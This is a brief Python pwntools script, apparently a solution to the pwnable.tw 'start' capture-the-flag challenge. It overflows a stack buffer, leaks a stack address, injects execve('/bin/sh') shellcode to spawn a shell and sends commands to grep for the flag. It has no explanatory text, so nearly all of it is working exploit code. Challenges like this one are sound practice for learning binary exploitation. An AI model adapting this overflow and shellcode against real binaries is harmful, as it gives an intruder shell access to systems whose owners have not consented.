from pwn import *

# server = remote('chall.pwnable.tw', 10000)
context.terminal = ['tmux','splitw','-h']
server = gdb.debug('./start')

print(server.read())

payload = b"AAAABBBBCCCCDDDDEEEE\x87\x80\x04\x08"

server.send(payload)

s = server.read()[:4]

stack_addr = int.from_bytes(s, byteorder='little')

payload = b"AAAABBBBCCCCDDDDEEEE" + p32(stack_addr + 20) + b"1\xc0\x83\xc0\x0b1\xc91\xd2h/sh\x00h/bin\x89\xe3\xcd\x80h\x9d\x80\x04\x08\xc3"
print(p32(stack_addr + 20))

server.send(payload)
server.send(b"cd /\x0agrep -raon 'FLAG{.*}' .\x0a")

server.interactive()


